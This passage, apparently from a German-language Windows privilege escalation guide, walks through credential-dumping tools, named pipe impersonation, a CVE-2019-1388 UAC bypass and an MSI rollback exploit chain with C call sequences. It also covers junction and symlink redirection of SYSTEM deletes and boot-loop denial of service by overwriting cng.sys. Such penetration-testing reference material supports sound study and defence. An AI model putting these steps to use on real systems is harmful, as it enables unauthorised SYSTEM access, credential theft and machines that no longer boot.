[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ist ein weiteres großartiges Tool, um Passwörter aus einem System zu extrahieren.

Das Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) sucht nach **Sitzungen**, **Benutzernamen** und **Passwörtern** für verschiedene Tools, die diese Daten im Klartext speichern (PuTTY, WinSCP, FileZilla, SuperPuTTY und RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Durchgesickerte Handles

Stell dir vor, **ein als SYSTEM laufender Prozess öffnet einen neuen Prozess** (`OpenProcess()`) mit **vollzugriff**. Derselbe Prozess **erstellt außerdem einen neuen Prozess** (`CreateProcess()`) **mit niedrigen Berechtigungen, der jedoch alle offenen Handles des Hauptprozesses erbt**.\
Wenn du dann **vollen Zugriff auf den Prozess mit niedrigen Berechtigungen hast**, kannst du dir das **offene Handle des privilegierten Prozesses**, das mit `OpenProcess()` erstellt wurde, holen und **Shellcode injizieren**.\
[Dieses Beispiel enthält weitere Informationen dazu, **wie du diese Schwachstelle erkennen und ausnutzen kannst**.](leaked-handle-exploitation.md)\
[Dieser **weitere Beitrag erklärt ausführlicher, wie du zusätzliche offene Handles von Prozessen und Threads mit unterschiedlichen Berechtigungsstufen (nicht nur Vollzugriff) testen und missbrauchen kannst, wenn sie vererbt werden**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Gemeinsam genutzte Speichersegmente, sogenannte **Pipes**, ermöglichen die Kommunikation und Datenübertragung zwischen Prozessen.

Windows bietet eine Funktion namens **Named Pipes**, mit der nicht zusammenhängende Prozesse Daten austauschen können, sogar über verschiedene Netzwerke hinweg. Das ähnelt einer Client/Server-Architektur mit den Rollen **Named-Pipe-Server** und **Named-Pipe-Client**.

Wenn ein **Client** Daten über eine Pipe sendet, kann der **Server**, der die Pipe eingerichtet hat, die **Identität des Clients annehmen**, sofern er über die erforderlichen **SeImpersonate**-Rechte verfügt. Wenn du einen **privilegierten Prozess** identifizierst, der über eine Pipe kommuniziert, die du nachahmen kannst, kannst du **höhere Berechtigungen erlangen**, indem du die Identität dieses Prozesses annimmst, sobald er mit der von dir eingerichteten Pipe interagiert. Anleitungen zur Durchführung eines solchen Angriffs findest du [**hier**](named-pipe-client-impersonation.md) und [**hier**](#from-high-integrity-to-system).

Das folgende Tool ermöglicht außerdem, **eine Named-Pipe-Kommunikation mit einem Tool wie Burp abzufangen:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **Mit diesem Tool kannst du alle Pipes auflisten und anzeigen, um Privescs zu finden:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv: Remote-DWORD-Schreibzugriff bis hin zu RCE

Der Telephony-Dienst (TapiSrv) stellt im Servermodus `\\pipe\\tapsrv` (MS-TRP) bereit. Ein entfernter, authentifizierter Client kann den auf Mailslots basierenden asynchronen Ereignispfad missbrauchen, um `ClientAttach` in einen beliebigen **4-Byte-Schreibzugriff** auf eine vorhandene Datei umzuwandeln, für die `NETWORK SERVICE` Schreibrechte besitzt. Anschließend kann er Telephony-Administratorrechte erlangen und eine beliebige DLL als Dienst laden. Der vollständige Ablauf:

- `ClientAttach` mit `pszDomainUser`, der auf einen beschreibbaren, vorhandenen Pfad gesetzt ist → der Dienst öffnet die Datei über `CreateFileW(..., OPEN_EXISTING)` und verwendet sie für asynchrone Ereignisschreibvorgänge.
- Jedes Ereignis schreibt den vom Angreifer kontrollierten `InitContext` aus `Initialize` in dieses Handle. Registriere mit `LRegisterRequestRecipient` (`Req_Func 61`) eine Line-App, löse `TRequestMakeCall` (`Req_Func 121`) aus und rufe die Ereignisse über `GetAsyncEvents` (`Req_Func 0`) ab. Hebe anschließend die Registrierung auf bzw. fahre den Dienst herunter, um die deterministischen Schreibvorgänge zu wiederholen.
- Füge dich in `C:\Windows\TAPI\tsec.ini` zu `[TapiAdministrators]` hinzu und verbinde dich erneut. Rufe dann `GetUIDllName` mit einem beliebigen DLL-Pfad auf, um `TSPI_providerUIIdentify` als `NETWORK SERVICE` auszuführen.

Weitere Details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Sonstiges

### Dateierweiterungen, über die unter Windows Programme ausgeführt werden können

Sieh dir die Seite **[https://filesec.io/](https://filesec.io/)** an.

### Missbrauch von Protocol Handlern / ShellExecute über Markdown-Renderer

An `ShellExecuteExW` weitergeleitete, anklickbare Markdown-Links können gefährliche URI-Handler (`file:`, `ms-appinstaller:` oder jedes registrierte Schema) auslösen und vom Angreifer kontrollierte Dateien als aktueller Benutzer ausführen. Siehe:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Befehlszeilen auf Passwörter überwachen**

Wenn du eine Shell als Benutzer erhältst, werden möglicherweise geplante Tasks oder andere Prozesse ausgeführt, die **Anmeldedaten in der Befehlszeile übergeben**. Das folgende Skript erfasst alle zwei Sekunden die Befehlszeilen von Prozessen, vergleicht den aktuellen Zustand mit dem vorherigen und gibt alle Unterschiede aus.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Passwörter aus Prozessen stehlen

## Vom Benutzer mit niedrigen Rechten zu NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Wenn du Zugriff auf die grafische Oberfläche hast (über Konsole oder RDP) und UAC aktiviert ist, kannst du in einigen Versionen von Microsoft Windows als nicht privilegierter Benutzer ein Terminal oder einen anderen Prozess wie „NT\AUTHORITY SYSTEM“ ausführen.

Dadurch ist es möglich, mit derselben Schwachstelle gleichzeitig die Berechtigungen zu erhöhen und UAC zu umgehen. Außerdem muss nichts installiert werden, und die während des Vorgangs verwendete Binärdatei ist von Microsoft signiert und herausgegeben.

Zu den betroffenen Systemen gehören unter anderem:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Um diese Schwachstelle auszunutzen, müssen folgende Schritte ausgeführt werden:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Sie finden alle erforderlichen Dateien und Informationen im folgenden GitHub-Repository:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Von Administrator Medium zu High Integrity Level / UAC-Bypass

Lesen Sie dies, um mehr über **Integritätsstufen** zu erfahren:


{{#ref}}
integrity-levels.md
{{#endref}}

Lesen Sie anschließend dies, um mehr über UAC und UAC-Bypasses zu erfahren:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Upload-Verzeichnis-Junctions in ein bereitgestelltes Stammverzeichnis

Eine Anwendung kann ein vorhersehbares Upload-Unterverzeichnis erstellen, einen vom Aufrufer angegebenen Dateinamen darin speichern und die Datei anschließend verarbeiten. Wenn ein Benutzer mit geringen Rechten dieses Unterverzeichnis entfernen und vor dem serverseitigen Schreibvorgang durch eine NTFS-Junction ersetzen kann, kann der Schreibvorgang der Junction in ein über das Web bereitgestelltes Verzeichnis folgen. Ein dort abgelegtes Skript kann mit der Identität des Webdienstes ausgeführt werden, sofern der Server diesen Dateityp ausführt. Dies ist eine anwendungsspezifische Grenze für beliebige Schreibvorgänge; ein beschreibbares Upload-Verzeichnis oder eine vorhandene Junction allein belegt dies nicht.

Prüfen Sie den genauen Pfadaufbau und den Zeitpunkt im Upload-Handler, die effektiven Lösch- und Erstellungsberechtigungen des Benutzers für das Unterverzeichnis, die effektiven ACLs des Ziels, ob der schreibende Prozess Reparse Points folgt und ob der Webserver Dateien in diesem Ziel ausführt. Ermitteln Sie die Prozessidentitäten des schreibenden Prozesses und des Webservers getrennt. Eine passive Bestandsaufnahme kann Verzeichnis-ACLs und Reparse-Metadaten anzeigen, aber weder das Verhalten des Handlers noch einen späteren Junction-Austausch nachweisen. Wenn die Ausführung unter einem Dienstkonto erfolgt, prüfen Sie das **tatsächliche Prozesstoken**, bevor Sie einen separaten Token-Privilege-Angriffspfad in Betracht ziehen.

## Von beliebigem Löschen/Verschieben/Umbenennen von Ordnern zu SYSTEM-EoP

Die in [**diesem Blogbeitrag**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) beschriebene Technik mit Exploit-Code, der [**hier verfügbar ist**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Bei dem Angriff wird im Wesentlichen die Rollback-Funktion von Windows Installer missbraucht, um während der Deinstallation legitime Dateien durch schädliche zu ersetzen. Dazu muss der Angreifer einen **bösartigen MSI-Installer** erstellen, mit dem der Ordner `C:\Config.Msi` gekapert wird. Windows Installer verwendet diesen später, um während der Deinstallation anderer MSI-Pakete Rollback-Dateien zu speichern. Diese Rollback-Dateien werden so geändert, dass sie die schädliche Payload enthalten.

### Windows Installer COM-Einschleusung in den Bereinigungspfad (CVE-2025-27727)

Ein Client mit geringen Rechten kann über das COM-Objekt `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) den SYSTEM-Dienst `msiexec.exe` erreichen. Beim Reverse Engineering wurden die relevanten `IMsiServer`-Aufrufe als `MsiBeginTransactionW` am vtable-Offset `0xA0`, `SetEEUIDirectoryAndFilter` am Offset `0xC8` und `CleanupTempPackages` am Offset `0x50` identifiziert. Diese Namen und Offsets wurden durch Reverse Engineering ermittelt und können je nach Build variieren.<sup>[[41]](#references)</sup>

Bei einem Nicht-Administrator imitiert `SetEEUIDirectoryAndFilter` den Aufrufer nur, während der angegebene Pfad mit `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` und `FILE_FLAG_OPEN_REPARSE_POINT` geöffnet wird. Dies belegt, dass der Aufrufer das Verzeichnis löschen kann, und verhindert, dass einer Reparse Point gefolgt wird. Es verknüpft das geprüfte Dateiobjekt jedoch **nicht** mit der späteren Bereinigung und beweist auch nicht, dass Windows Installer das Verzeichnis erstellt hat.<sup>[[41]](#references)</sup>

Nach `MsiBeginTransactionW` plant `SetEEUIDirectoryAndFilter` den Pfad unabhängig vom Filterargument des Aufrufers als Ordner ein. Der Dienst schreibt unter `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` einen benannten `REG_DWORD`-Wert: Der Wertname ist der vom Aufrufer kontrollierte Pfad, und die Daten `0x00000002` kennzeichnen den Ordner. `CleanupTempPackages(NULL, FALSE)` startet anschließend direkt die Bereinigung. Der erhöhte Worker zählt die Registrierungswerte auf und übergibt Ordner-Einträge an `FDeleteFolder`, ohne die Herkunft des Pfads zu prüfen. Schlägt das normale Entfernen fehl, ruft der Code außerdem `LockdownPath` auf, löscht die Dateiattribute und versucht es erneut.<sup>[[41]](#references)</sup>

Die minimale Aufrufsequenz, die aus `msi.dll` rekonstruiert wurde, lautet:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Das nützliche Primitive ist die Wiederverwendung eines Pfads statt einer Junction-Umleitung. Registriere ein vom Angreifer erstelltes `C:\Config.Msi`, entferne es und lass Windows Installer später denselben Pfad mit geschützten Rollback-Daten erneut erstellen. Die Bereinigung vertraut dem veralteten Namen `TempPackages` und löscht das neue Verzeichnis als SYSTEM. Damit wird die vorgesehene Grenze durch `FILE_FLAG_OPEN_REPARSE_POINT` und die Mitigation für Umleitungsvertrauen umgangen, da kein Reparse Point erforderlich ist.<sup>[[41]](#references)</sup>

Dieses Lösch-Primitive passt zur folgenden Rollback-Kette: Bewahre den separaten `Installer\Folders`-Eintrag auf, lösche das geschützte `C:\Config.Msi`, erstelle es mit einer NULL-DACL neu und behalte ein Handle mit `WRITE_DAC`, bevor der Installer die DACL absichert. Über das vorab geöffnete Handle kann mit `NtSetSecurityObject` eine freizügige DACL wiederhergestellt werden. Danach kann die generierte `.rbs` ersetzt werden, bevor das Rollback fortgesetzt wird.<sup>[[41]](#references)</sup>

Microsoft hat den Pfad behoben, indem verhindert wird, dass `CMsiTransaction::SetEEUIDirectoryAndFilter` `ScheduleFileOrFolderDelete` aufruft, wenn das neue Feature-Gate aktiviert ist. Der COM-Aufruf kann weiterhin erfolgreich zurückkehren, trägt den vom Angreifer kontrollierten Pfad aber nicht mehr in `TempPackages` ein. Installiere die Windows-Sicherheitsupdates vom April 2025, statt eine erfolgreiche Rückgabe der Methode als Patch-Test zu verwenden.<sup>[[41]](#references)[[42]](#references)</sup>

Die zusammengefasste Technik sieht folgendermaßen aus:

1. **Phase 1 – Vorbereitung des Hijack ( `C:\Config.Msi` leer lassen)**

- Schritt 1: Installiere das MSI
    - Erstelle ein `.msi`, das eine harmlose Datei (z. B. `dummy.txt`) in einem beschreibbaren Ordner (`TARGETDIR`) installiert.
    - Markiere den Installer als **„UAC Compliant“**, damit ein **Benutzer ohne Admin-Rechte** ihn ausführen kann.
    - Lass nach der Installation ein **Handle** für die Datei geöffnet.

- Schritt 2: Deinstallation starten
    - Deinstalliere dasselbe `.msi`.
    - Der Deinstallationsprozess beginnt, Dateien nach `C:\Config.Msi` zu verschieben und sie in `.rbf`-Dateien (Rollback-Backups) umzubenennen.
    - **Überwache das geöffnete Datei-Handle** mit `GetFinalPathNameByHandle`, um festzustellen, wann die Datei zu `C:\Config.Msi\<random>.rbf` wird.

- Schritt 3: Benutzerdefinierte Synchronisierung
    - Das `.msi` enthält eine **benutzerdefinierte Deinstallationsaktion (`SyncOnRbfWritten`)**, die:
        - signalisiert, wenn die `.rbf` geschrieben wurde.
        - Danach **wartet**, bis ein weiteres Ereignis eintritt, bevor die Deinstallation fortgesetzt wird.

- Schritt 4: Löschen der `.rbf` verhindern
    - Öffne nach dem Signal die `.rbf`-Datei **ohne `FILE_SHARE_DELETE`** – dadurch **kann sie nicht gelöscht werden**.
    - Sende anschließend ein Signal zurück, damit die Deinstallation abgeschlossen werden kann.
    - Windows Installer kann die `.rbf` nicht löschen. Da nicht alle Inhalte gelöscht werden können, wird **`C:\Config.Msi` nicht entfernt**.

- Schritt 5: `.rbf` manuell löschen
    - Lösche als Angreifer die `.rbf`-Datei manuell.
    - Jetzt ist **`C:\Config.Msi` leer** und bereit für den Hijack.

> An diesem Punkt **löst du die Sicherheitslücke zum Löschen beliebiger Ordner auf SYSTEM-Ebene aus**, um `C:\Config.Msi` zu löschen.

2. **Phase 2 – Rollback-Skripte durch bösartige Skripte ersetzen**

- Schritt 6: `C:\Config.Msi` mit schwachen ACLs neu erstellen
    - Erstelle den Ordner `C:\Config.Msi` selbst neu.
    - Setze **schwache DACLs** (z. B. Everyone:F) und **behalte ein Handle mit `WRITE_DAC` geöffnet**.

- Schritt 7: Eine weitere Installation ausführen
    - Installiere das `.msi` erneut mit:
        - `TARGETDIR`: einem beschreibbaren Speicherort.
        - `ERROROUT`: einer Variable, die einen erzwungenen Fehler auslöst.
    - Diese Installation wird verwendet, um erneut ein **Rollback** auszulösen, das `.rbs` und `.rbf` einliest.

- Schritt 8: Nach `.rbs` suchen
    - Überwache `C:\Config.Msi` mit `ReadDirectoryChangesW`, bis eine neue `.rbs` erscheint.
    - Erfasse ihren Dateinamen.

- Schritt 9: Vor dem Rollback synchronisieren
    - Das `.msi` enthält eine **benutzerdefinierte Installationsaktion (`SyncBeforeRollback`)**, die:
        - ein Ereignis signalisiert, wenn die `.rbs` erstellt wurde.
        - Danach **wartet**, bevor der Vorgang fortgesetzt wird.

- Schritt 10: Schwache ACL erneut anwenden
    - Nachdem du das Ereignis „`.rbs created`“ erhalten hast:
        - Wendet Windows Installer erneut starke ACLs auf `C:\Config.Msi` an.
        - Da du aber weiterhin ein Handle mit `WRITE_DAC` hast, kannst du **erneut schwache ACLs anwenden**.

> ACLs werden **nur beim Öffnen eines Handles durchgesetzt**, daher kannst du weiterhin in den Ordner schreiben.

- Schritt 11: Gefälschte `.rbs` und `.rbf` ablegen
    - Überschreibe die `.rbs`-Datei mit einem **gefälschten Rollback-Skript**, das Windows anweist:
        - deine `.rbf`-Datei (bösartige DLL) an einem **privilegierten Speicherort** wiederherzustellen (z. B. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Lege deine gefälschte `.rbf` ab, die eine **bösartige DLL-Payload auf SYSTEM-Ebene** enthält.

- Schritt 12: Rollback auslösen
    - Sende das Synchronisierungssignal, damit der Installer fortgesetzt wird.
    - Eine **benutzerdefinierte Aktion vom Typ 19 (`ErrorOut`)** ist so konfiguriert, dass sie die Installation an einem bekannten Punkt **absichtlich fehlschlagen lässt**.
    - Dadurch beginnt das **Rollback**.

- Schritt 13: SYSTEM installiert deine DLL
    - Windows Installer:
        - Liest deine bösartige `.rbs`.
        - Kopiert deine `.rbf`-DLL an den Zielort.
    - Jetzt befindet sich deine **bösartige DLL in einem von SYSTEM geladenen Pfad**.

- Letzter Schritt: SYSTEM-Code ausführen
    - Führe eine vertrauenswürdige **automatisch erhöhte Binärdatei** aus (z. B. `osk.exe`), die die von dir gehijackte DLL lädt.
    - **Boom**: Dein Code wird **als SYSTEM** ausgeführt.


### Von beliebigem Löschen/Verschieben/Umbenennen von Dateien zu SYSTEM-EoP

Die zentrale MSI-Rollback-Technik (die vorherige) setzt voraus, dass du einen **gesamten Ordner** löschen kannst (z. B. `C:\Config.Msi`). Aber was, wenn deine Sicherheitslücke nur das **Löschen beliebiger Dateien** ermöglicht?

Du könntest **NTFS-Interna** ausnutzen: Jeder Ordner hat einen verborgenen alternativen Datenstrom namens:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Dieser Stream speichert die **Index-Metadaten** des Ordners.

Wenn Sie also den Stream `::$INDEX_ALLOCATION` eines Ordners **löschen**, entfernt NTFS **den gesamten Ordner** aus dem Dateisystem.

Sie können dies mit standardmäßigen APIs zum Löschen von Dateien tun, wie etwa:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Auch wenn du eine API zum Löschen einer *Datei* aufrufst, **löscht sie den Ordner selbst**.

### Vom Löschen von Ordnerinhalten zu SYSTEM-EoP
Was, wenn dein Primitive es dir nicht erlaubt, beliebige Dateien/Ordner zu löschen, aber **das Löschen der *Inhalte* eines vom Angreifer kontrollierten Ordners ermöglicht**?

1. Schritt 1: Einen Köderordner und eine Datei erstellen
- Erstellen: `C:\temp\folder1`
- Darin: `C:\temp\folder1\file1.txt`

2. Schritt 2: Ein **oplock** auf `file1.txt` setzen
- Das oplock **pausiert die Ausführung**, wenn ein privilegierter Prozess versucht, `file1.txt` zu löschen.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Schritt 3: SYSTEM-Prozess auslösen (z. B. `SilentCleanup`)
- Dieser Prozess durchsucht Ordner (z. B. `%TEMP%`) und versucht, deren Inhalte zu löschen.
- Wenn er `file1.txt` erreicht, **wird der oplock ausgelöst** und übergibt die Kontrolle an deinen Callback.

4. Schritt 4: Im oplock-Callback – das Löschen umleiten

- Option A: `file1.txt` an einen anderen Ort verschieben
    - Dadurch wird `folder1` geleert, ohne den oplock zu unterbrechen.
    - `file1.txt` nicht direkt löschen – dadurch würde der oplock vorzeitig freigegeben.

- Option B: `folder1` in eine **junction** umwandeln:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Option C: Erstelle einen **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Dies zielt auf den internen NTFS-Stream ab, der Ordner-Metadaten speichert — wenn du ihn löschst, wird der Ordner gelöscht.

5. Schritt 5: Oplock freigeben
- Der SYSTEM-Prozess läuft weiter und versucht, `file1.txt` zu löschen.
- Doch jetzt löscht er aufgrund der Junction + Symlink tatsächlich:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Ergebnis**: `C:\Config.Msi` wird von SYSTEM gelöscht.

### Von beliebigem Ordner erstellen zu permanentem DoS

Nutze eine Primitive aus, mit der du **einen beliebigen Ordner als SYSTEM/admin erstellen** kannst – selbst wenn **du keine Dateien schreiben** oder **schwache Berechtigungen festlegen** kannst.

Erstelle einen **Ordner** (keine Datei) mit dem Namen eines **kritischen Windows-Treibers**, z. B.:
```
C:\Windows\System32\cng.sys
```

- Dieser Pfad entspricht normalerweise dem Kernelmodus-Treiber `cng.sys`.
- Wenn Sie **ihn vorab als Ordner erstellen**, kann Windows den eigentlichen Treiber beim Start nicht laden.
- Windows versucht dann, `cng.sys` während des Starts zu laden.
- Es findet den Ordner, **kann den eigentlichen Treiber nicht auflösen** und **stürzt ab oder hält den Start an**.
- Es gibt **keinen Fallback** und **keine Wiederherstellung** ohne externes Eingreifen (z. B. eine Startreparatur oder Festplattenzugriff).

### Von privilegierten Log-/Backup-Pfaden + OM symlinks zu beliebigem Datei-Überschreiben / boot DoS

Wenn ein **privilegierter Dienst** Logs/Exporte in einen Pfad schreibt, der aus einer **beschreibbaren Konfiguration** gelesen wird, können Sie diesen Pfad mit **Object Manager symlinks + NTFS mount points** umleiten und so den privilegierten Schreibvorgang in ein beliebiges Überschreiben verwandeln (auch **ohne** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Voraussetzungen**
- Die Konfiguration, in der der Zielpfad gespeichert ist, kann vom Angreifer beschrieben werden (z. B. `%ProgramData%\...\.ini`).
- Möglichkeit, einen Mount Point zu `\RPC Control` und einen OM-Datei-Symlink zu erstellen (James Forshaws [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Ein privilegierter Vorgang, der in diesen Pfad schreibt (Log, Export, Bericht).

**Beispielkette**
1. Lesen Sie die Konfiguration aus, um das Ziel des privilegierten Logs zu ermitteln, z. B. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Leiten Sie den Pfad ohne Administratorrechte um:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Warte, bis die privilegierte Komponente das Log schreibt (z. B. wenn ein Administrator „Test-SMS senden“ auslöst). Der Schreibvorgang landet nun in `C:\Windows\System32\cng.sys`.
4. Untersuche das überschriebene Ziel (Hex-/PE-Parser), um die Beschädigung zu bestätigen; ein Neustart zwingt Windows, den manipulierten Treiberpfad zu laden → **Bootloop-DoS**. Das lässt sich auch auf jede geschützte Datei übertragen, die ein privilegierter Dienst zum Schreiben öffnet.

> `cng.sys` wird normalerweise aus `C:\Windows\System32\drivers\cng.sys` geladen. Wenn jedoch eine Kopie unter `C:\Windows\System32\cng.sys` vorhanden ist, kann zuerst versucht werden, diese zu laden. Dadurch eignet sie sich zuverlässig als DoS-Ziel für beschädigte Daten.



## **Von hoher Integrität zu SYSTEM**

### **Neuer Dienst**

Wenn du bereits in einem Prozess mit hoher Integrität ausführst, kann der **Weg zu SYSTEM** ganz einfach sein: **einen neuen Dienst erstellen und ausführen**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Beim Erstellen einer Service-Binary solltest du sicherstellen, dass sie ein gültiger Service ist oder die erforderlichen Aktionen schnell ausführt, da sie nach 20 Sekunden beendet wird, wenn sie kein gültiger Service ist.

### AlwaysInstallElevated

Aus einem High-Integrity-Prozess kannst du versuchen, **die AlwaysInstallElevated-Registry-Einträge zu aktivieren** und eine Reverse Shell mithilfe eines _**.msi**_-Wrappers zu **installieren**.\
[Weitere Informationen zu den betreffenden Registry-Schlüsseln und zur Installation eines _.msi_-Pakets findest du hier.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Den Code findest du** [**hier**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Wenn du über diese Token-Privilegien verfügst (wahrscheinlich findest du sie in einem Prozess mit bereits hoher Integrität), kannst du mit dem SeDebug-Privileg **fast jeden Prozess öffnen** (außer geschützte Prozesse), den **Token** des Prozesses **kopieren** und einen **beliebigen Prozess mit diesem Token erstellen**.\
Bei dieser Technik wird üblicherweise **ein beliebiger Prozess ausgewählt, der als SYSTEM mit allen Token-Privilegien ausgeführt wird** (_ja, es gibt SYSTEM-Prozesse ohne alle Token-Privilegien_).\
**Ein** [**Codebeispiel für die vorgeschlagene Technik findest du hier**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Diese Technik wird von meterpreter für die Eskalation mit `getsystem` verwendet. Dabei wird **eine Pipe erstellt und anschließend ein Service erstellt oder missbraucht, um in diese Pipe zu schreiben**. Der **Server**, der die Pipe mithilfe des **`SeImpersonate`**-Privilegs erstellt hat, kann dann den **Token des Pipe-Clients** (des Services) impersonieren und SYSTEM-Privilegien erhalten.\
Wenn du [**mehr über Named Pipes erfahren möchtest, solltest du dies lesen**](#named-pipe-client-impersonation).\
Wenn du ein Beispiel dafür lesen möchtest, [**wie du mithilfe von Named Pipes von hoher Integrität zu System wechselst, solltest du dies lesen**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Wenn es dir gelingt, eine DLL zu **hijacken**, die von einem **Prozess** mit **SYSTEM**-Rechten **geladen** wird, kannst du beliebigen Code mit diesen Rechten ausführen. Dll Hijacking eignet sich daher auch für diese Art der Privilegieneskalation und ist außerdem **aus einem Prozess mit hoher Integrität viel einfacher umzusetzen**, da dieser **Schreibrechte** auf die Ordner hat, aus denen DLLs geladen werden.\
**Mehr über Dll Hijacking erfährst du** [**hier**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Lies:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Weitere Hilfe

[Statische impacket-Binaries](https://github.com/ropnop/impacket_static_binaries)

## Nützliche Tools

**Bestes Tool, um lokale Windows-Privilegieneskalationsvektoren zu finden:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Sucht nach Fehlkonfigurationen und sensiblen Dateien (**[**hier prüfen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Wird erkannt.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Sucht nach möglichen Fehlkonfigurationen und sammelt Informationen (**[**hier prüfen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Sucht nach Fehlkonfigurationen**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrahiert gespeicherte Sitzungsinformationen aus PuTTY, WinSCP, SuperPuTTY, FileZilla und RDP. Lokal mit -Thorough verwenden.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrahiert Zugangsdaten aus dem Credential Manager. Wird erkannt.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Sprüht gesammelte Passwörter über die gesamte Domäne**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ist ein PowerShell-Tool für ADIDNS/LLMNR/mDNS-Spoofing und Man-in-the-Middle-Angriffe.**\
